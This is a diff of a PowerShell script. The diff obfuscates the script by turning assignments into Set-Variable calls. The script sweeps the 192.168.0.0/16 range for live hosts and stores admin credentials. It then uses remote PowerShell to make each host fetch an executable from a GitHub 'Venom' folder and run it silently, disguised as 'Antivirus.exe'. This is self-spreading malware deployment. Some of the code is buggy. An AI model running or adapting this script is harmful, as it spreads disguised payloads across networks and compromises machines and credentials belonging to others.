@@ -1,17 +1,17 @@
 function random_text {
-    return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
+    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 }
 
-$logFile = "$env:temp\deployment_log.txt"
-$credentialPath = "$env:USERPROFILE\Documents\adminCreds.xml"
-$activeIPsFile = "$env:temp\$path\activeips.txt"
+Set-Variable -Name logFile -Value ("$env:temp\deployment_log.txt")
+Set-Variable -Name credentialPath -Value ("$env:USERPROFILE\Documents\adminCreds.xml")
+Set-Variable -Name activeIPsFile -Value ("$env:temp\$path\activeips.txt")
 
 function Log-Message {
     param (
         [string]$message
     )
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    Add-Content -Path $logFile -Value "[$timestamp] $message"
+    Set-Variable -Name timestamp -Value (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+    Add-Content -Value "[$timestamp] $message" -Path $logFile
 }
 
 #Enable-PSRemoting -Force
@@ -24,12 +24,12 @@ if ((Get-Service -Name winrm).Status -ne 'Running') {
 
 
 function Get-ActiveIPs {
-    $baseSubnet = "192.168."
-    $activeIPs = @()
-    for ($j = 1; $j -le 254; $j++) {
-        $subnet = $baseSubnet + $j + "."
-        for ($i = 1; $i -le 254; $i++) {
-            $ip = $subnet + $i
+    Set-Variable -Name baseSubnet -Value ("192.168.")
+    Set-Variable -Name activeIPs -Value (@())
+    for (Set-Variable -Name j -Value (1); $j -le 254; $j++) {
+        Set-Variable -Name subnet -Value ($baseSubnet + $j + ".")
+        for (Set-Variable -Name i -Value (1); $i -le 254; $i++) {
+            Set-Variable -Name ip -Value ($subnet + $i)
             try {
                 if (Test-Connection -ComputerName $ip -Count 1 -TimeoutSeconds 5 -Quiet) {
                     $activeIPs += $ip
@@ -45,15 +45,15 @@ function Get-ActiveIPs {
 
 }
 
-$wd = random_text
-$path = "$env:temp\$wd"
-$installerUrl = '"https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.exe" -OutFile "AssassinsCreed_SE.exe"'
-$targets = Get-ActiveIPs
-$desktoppath = [System.Environment]::GetFolderPath("Desktop")
+Set-Variable -Name wd -Value (random_text)
+Set-Variable -Name path -Value ("$env:temp\$wd")
+Set-Variable -Name installerUrl -Value ('"https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.exe" -OutFile "AssassinsCreed_SE.exe"')
+Set-Variable -Name targets -Value (Get-ActiveIPs)
+Set-Variable -Name desktoppath -Value ([Environment]::GetFolderPath("Desktop"))
 
 mkdir $path
 cd $path
-Add-Content -Path $activeIPsFile -Value "$ip`n"
+Add-Content -Value "$ip`n" -Path $activeIPsFile
 
 
 # if (-not (Test-Path $installerUrl)) {
@@ -66,21 +66,21 @@ Add-Content -Path $activeIPsFile -Value "$ip`n"
 
 
 # Save credentials securely
-$cred = Get-Credential
+Set-Variable -Name cred -Value (Get-Credential)
 $cred | Export-Clixml -Path $credentialPath
 
 # Retrieve credentials securely
-$adminCreds = Import-Clixml -Path $credentialPath
+Set-Variable -Name adminCreds -Value (Import-Clixml -Path $credentialPath)
 
 
 function Invoke-Retry {
     param (
-        [scriptblock]$scriptblock,
-        [int]$retries = 3,
-        [int]$delay = 5
+        [Int]$delay = 5,
+        [Management.Automation.ScriptBlock]$scriptblock,
+        [Int]$retries = 3
     )
 
-    for ($i = 1; $i -le $retries; $i++) {
+    for (Set-Variable -Name i -Value (1); $i -le $retries; $i++) {
         try {
             & $scriptblock
             return $true
@@ -92,12 +92,12 @@ function Invoke-Retry {
     return $false
 }
 
-$maxJobs = 10
-$jobQueue = @()
+Set-Variable -Name maxJobs -Value (10)
+Set-Variable -Name jobQueue -Value (@())
 
 foreach ($target in $targets) {
     while ($jobQueue.Count -ge $maxJobs) {
-        $completedJobs = $jobQueue | Where-Object { $_.State -eq 'Completed' }
+        Set-Variable -Name completedJobs -Value ($jobQueue | Where-Object { $_.State -eq 'Completed' })
         $completedJobs | ForEach-Object {
             Receive-Job -Job $_
             Remove-Job -Job $_
@@ -106,31 +106,31 @@ foreach ($target in $targets) {
         Start-Sleep -Seconds 1
     }
 
-    $job = Start-Job -ScriptBlock {
-        param ($installerUrlUrl, $target, $adminCreds)
+    Set-Variable -Name job -Value (Start-Job -ArgumentList $installerUrlUrl, $target, $adminCreds -ScriptBlock {
+        param ($target, $installerUrlUrl, $adminCreds)
         try {
-            $randomFolder = [System.IO.Path]::Combine($env:TEMP, (Get-Random -Count 5 | ForEach-Object { [char]$_ } -join ''))
-            New-Item -Path $randomFolder -ItemType Directory -ErrorAction Stop
-            $installerUrlPath = "$randomFolder\Antivirus.exe"
+            Set-Variable -Name randomFolder -Value ([IO.Path]::Combine($env:TEMP, (Get-Random -Count 5 | ForEach-Object { [char]$_ } -join '')))
+            New-Item -Path $randomFolder -ErrorAction Stop -ItemType Directory
+            Set-Variable -Name installerUrlPath -Value ("$randomFolder\Antivirus.exe")
 
-            Invoke-Command -ComputerName $target -ScriptBlock {
-                param ($installerUrlUrl, $installerUrlPath, $desktoppath)
+            Invoke-Command -Credential $using:adminCreds -ArgumentList $installerUrlUrl, $installerUrlPath, $desktoppath -ScriptBlock {
+                param ($desktoppath, $installerUrlPath, $installerUrlUrl)
                 Invoke-WebRequest -Uri $installerUrlUrl -OutFile $installerUrlPath -ErrorAction Stop
                 Copy-Item -Path $installerUrlPath -Destination $desktoppath -ErrorAction Stop
-                Start-Process -FilePath "$desktoppath\Antivirus.exe" -ArgumentList "/silent" -Wait
-            } -ArgumentList $installerUrlUrl, $installerUrlPath, $desktoppath -Credential $using:adminCreds -ErrorAction Stop
+                Start-Process -Wait -FilePath "$desktoppath\Antivirus.exe" -ArgumentList "/silent"
+            } -ErrorAction Stop -ComputerName $target
         }
         catch {
             Log-Message "Failed to deploy to $target : $($_)"
         }
-    } -ArgumentList $installerUrlUrl, $target, $adminCreds
+    })
 
-    $jobQueue += $job
+    Set-Variable -Name jobQueue -Value ($jobQueue + ($job))
 }
 
 # Wait for remaining jobs to complete
 while ($jobQueue.Count -gt 0) {
-    $completedJobs = $jobQueue | Where-Object { $_.State -eq 'Completed' }
+    Set-Variable -Name completedJobs -Value ($jobQueue | Where-Object { $_.State -eq 'Completed' })
     $completedJobs | ForEach-Object {
         Receive-Job -Job $_
         Remove-Job -Job $_
